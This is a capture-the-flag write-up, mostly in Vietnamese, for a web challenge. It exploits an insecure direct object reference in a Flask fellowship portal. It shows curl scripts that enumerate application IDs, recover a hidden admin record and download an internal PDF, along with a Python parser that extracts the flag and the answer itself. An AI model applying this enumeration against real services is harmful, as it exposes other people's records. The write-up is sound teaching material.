---
title: "The Missing Application"
category: "Web"
tags: ["broken-access-control", "idor", "pdf"]
solve_date: "2026-10-10T20:03:00+07:00"
language: "vi"
points: 200
---

# The Missing Application

**Flag:** `foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}`
**Dịch vụ:** `http://54.87.116.237:5001` (Flask + gunicorn, server-rendered, instance dùng chung)

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `internal_review.pdf` (từ `/documents/7341/download`) | 2,049 | `9f8764958d692b171b30f08123dfb5ce781a9923a21bb97da27623d6ecaf06d3` |

## Đề bài

> A college has launched an online portal where students can apply for a prestigious technology
> fellowship. You register as a normal applicant and explore the portal, where you can submit
> applications, view your details, and track your application status.
>
> However, something doesn't add up. One application has mysteriously disappeared from the public
> dashboard, and rumours suggest that it contains a message the administrator never intended to
> reveal.

Hint: *Sometimes the browser shows you less than the server does.* Flag format `foobarnitd{...}`.

## Phân tích

Bề mặt ứng dụng chỉ có bốn route công khai: `/`, `/register`, `/login`, `/logout`; `/dashboard` trả
`302` khi chưa có session. Probe `/admin`, `/debug`, `/api`, `/api/applications`, `/robots.txt`,
`/.env`, `/.git/HEAD`, `/flag.txt` đều nhận `404` mặc định của Werkzeug, ; các phản hồi này chỉ giới hạn các path đã khảo sát.

Cookie session đầu tiên sau khi đăng ký:

```text
session=eyJhcHBsaWNhdGlvbl9pZCI6MTA4NiwidXNlcl9pZCI6Mzl9.aso2qw.y_tMtjWtSSHxvEq1duUoZNlOyuU
```

Payload base64 giải mã thành `{"application_id":1086,"user_id":39}` (decode không cần secret key;
signature chỉ dùng để xác thực, không được kiểm tra ở đây). Hai định danh này lệch nhau rất xa: tài
khoản thứ 39 nhưng application thứ 1086, nên `application_id` không được cấp theo vòng đời user và
phần lớn application không tương ứng với tài khoản nào — dữ liệu được seed sẵn.

`/dashboard` chỉ render application của chính user: HTML nhúng `fetch("/api/application/1086")` và in
toàn bộ JSON ra thẻ `<pre>`. Không có trang danh sách công khai nào trong UI, vì vậy API là nguồn dữ
liệu thật.

`GET /api/application/<id>` dùng id lấy từ URL và không đối chiếu với `application_id` trong session,
nên đọc được bản ghi của bất kỳ application nào:

```text
/api/application/1001 -> {"id":1001,"internal_note":"Automated note: application 1001 processed normally.","name":"rahul_sharma","status":"pending"}
/api/application/1079 -> {"id":1079,"internal_note":"Thank you for applying to the fellowship.","name":"testuser1","status":"pending"}
/api/application/1     -> {"error":"application not found"}
```

Thử buộc API trả thêm dữ liệu qua tham số (`?id=`, `?application_id=`, `?all=1`, `?hidden=1`,
`?internal=true`, `?debug=1`) trên chính bản ghi của mình: server luôn trả đúng bản ghi của user, bỏ
qua tham số. Hướng "UI ẩn field nhưng API trả field" vì thế không áp dụng được — thứ bị ẩn là cả bản
ghi, không phải một cột.

Enum `990..1087` cho thấy cấu trúc dữ liệu: `1001..1047` là dải seed liền mạch với `internal_note`
theo mẫu `Automated note: application <id> processed normally.`, còn `1048` trở lên là tài khoản các
đội chơi khác tạo trong lúc chạy (`1088` trở đi chưa tồn tại). Trong dải seed, đúng một bản ghi lệch
mẫu:

```json
{"document":"/api/documents/7341","id":1047,"internal_note":"Application withdrawn pending internal review. See attached document.","name":"admin","status":"withdrawn"}
```

`#1047` có `name: admin`, `status: withdrawn` và là bản ghi duy nhất mang thêm khóa `document` — khóa
này không xuất hiện trong các JSON còn lại của dải `1001..1047` đã khảo sát. Đây chính là application "biến mất":
nó không được UI liệt kê ở đâu cả, nhưng API vẫn trả về đầy đủ.

`GET /api/documents/7341` trả `401 {"error":"authentication required"}` cho request không có session
và `200` khi có session:

```json
{"download":"/documents/7341/download","filename":"internal_review.pdf"}
```

Tham chiếu document không theo số thứ tự: `/api/documents/1`, `/api/documents/7340`,
`/api/documents/7342` đều trả `document not found`, nên giá trị `7341` chỉ lấy được từ bản ghi `#1047`.

## Lời giải

Chuỗi khai thác là hai lỗi tầng đối tượng nối tiếp nhau, cộng thêm một bước đọc file:

1. **`/api/application/<id>` bỏ qua kiểm tra quyền sở hữu** — id trong URL được dùng trực tiếp để tra
   bản ghi. Vì application id là counter toàn cục và UI không liệt kê application nào ngoài bản ghi
   của mình, lời giải duyệt dải ID để tìm bản ghi không được UI liệt kê.
2. **Bản ghi seed `#1047` lộ liên kết tài liệu nội bộ.** Khóa `document` có mặt ở record này là dẫn
   chứng duy nhất về sự tồn tại của endpoint `/api/documents/<id>`.
3. **`/documents/7341/download` trả PDF nội bộ**, `Content-Type: application/pdf`, `Content-Length: 2049`.

PDF chứa flag ở hai vị trí độc lập; cả hai đều không nổi bật khi mở file bằng PDF viewer thông thường:

- Dictionary Info của file lưu flag trong `/Keywords`:

```text
<<
/Author (NIT Durgapur Fellowship Committee) /CreationDate (D:20261010103328+00'00') /Creator (ReportLab PDF Library - www.reportlab.com) /Keywords (internal-use-only flag=foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}) /ModDate (D:20261010103328+00'00') /Producer (ReportLab PDF Library - www.reportlab.com)
  /Subject (Internal Review) /Title (Internal Review - Application 1047) /Trapped /False
>>
```

- Content stream của trang (object `8 0 obj`) đặt một dòng chữ màu gần-trắng, tô bằng `.97 .97 .97 rg`
  ngay sau câu "This document is for internal committee use only." (`.` = RGB xám 0.97, sát nền trắng nên
  khó thấy trên trang được render):

```text
.97 .97 .97 rg
BT /F1 10 Tf 12 TL ET
BT 1 0 0 1 72 491.8898 Tm (audit-ref:foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}) Tj T* ET
```

Text hiển thị của trang khớp với mô tả trong `internal_note`: ứng dụng bị rút trước hạn review và bị
gỡ khỏi dashboard để phục vụ audit nội bộ. Hai bản flag trùng nhau từng ký tự.

## Kết quả

```text
foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}
```

Flag đọc trực tiếp từ artifact PDF tải về, xác nhận bởi hai nguồn độc lập trong cùng file (`/Keywords`
và text màu gần-trắng trong content stream). Chưa lưu phản hồi submission.

## Tái hiện

Cần `curl`, `python3` (chỉ dùng `base64`, `re`, `zlib` trong stdlib) và một instance còn hoạt động.
Toàn bộ thao tác là `GET`, ngoại trừ một lần `POST /register` để lấy session.

```bash
B=http://54.87.116.237:5001
export MSYS_NO_PATHCONV=1   # Git Bash on Windows: keep arguments that start with / intact

# 1. Register an ordinary applicant and keep the session cookie
curl -sS -c jar.txt -X POST "$B/register" -d "username=viewer&password=viewerpass"
curl -sS -b jar.txt "$B/dashboard" | grep -E 'application ID|api/application'

# 2. Read the session payload (no secret key needed)
awk '$6=="session"{print $7}' jar.txt | cut -d. -f1 | base64 -d; echo

# 3. Enumerate the seeded application range, keep the records that deviate from the template
seq 990 1087 | xargs -P 6 -I{} sh -c \
  'curl -sS -b jar.txt --max-time 10 "'"$B"'/api/application/{}" | sed "s/^/{} /"' >> all.jsonl
grep '"error"' all.jsonl | awk '{print $1}' | tr '\n' ' '; echo
grep -v '"error"' all.jsonl | grep -v 'Automated note: application [0-9]* processed normally\.' | sort -n

# 4. Take the document link from record 1047 and download the PDF
curl -sS -b jar.txt "$B/api/documents/7341"
curl -sS -b jar.txt -o internal_review.pdf "$B/documents/7341/download"

# 5. Flag present in the raw PDF (metadata) and in the content stream
grep -a -o 'foobarnitd{[^}]*}' internal_review.pdf
```

Để đọc nội dung đã nén của trang, lưu fenced block sau thành `read_pdf.py` và chạy
`python read_pdf.py internal_review.pdf`:

```python
import base64, re, sys, zlib

raw = open(sys.argv[1], "rb").read()

# Info dictionary: /Keywords is not rendered by a PDF viewer
for obj in re.finditer(rb'\d+ 0 obj(.*?)endobj', raw, re.S):
    if b'/Keywords' in obj.group(1):
        print(obj.group(1).decode('latin-1'))

# Page content stream: ASCII85Decode + FlateDecode
for obj in re.finditer(rb'\d+ 0 obj(.*?)endobj', raw, re.S):
    body = obj.group(1)
    if b'/Filter' in body and b'stream' in body:
        data = re.search(rb'stream\r?\n(.*?)endstream', body, re.S).group(1).strip().rstrip(b'~>')
        print(zlib.decompress(base64.a85decode(data)).decode('latin-1'))
```

```text
/Keywords (internal-use-only flag=foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs})
...
.97 .97 .97 rg
BT 1 0 0 1 72 491.8898 Tm (audit-ref:foobarnitd{1d0r_ch41ns_l34d_t0_h1dd3n_d0cs}) Tj T* ET
```

Hai lưu ý khi chạy lại: `xargs -P` có thể làm mất một dòng output do các tiến trình `curl` ghi xen kẽ
(trong bản này id `1014` cần query lại riêng — nó vẫn tồn tại, không phải gap); và instance dùng chung
sẽ có thêm application id cao hơn do các đội khác đăng ký, nên giới hạn enum trên nên lấy theo id của
chính tài khoản vừa tạo.
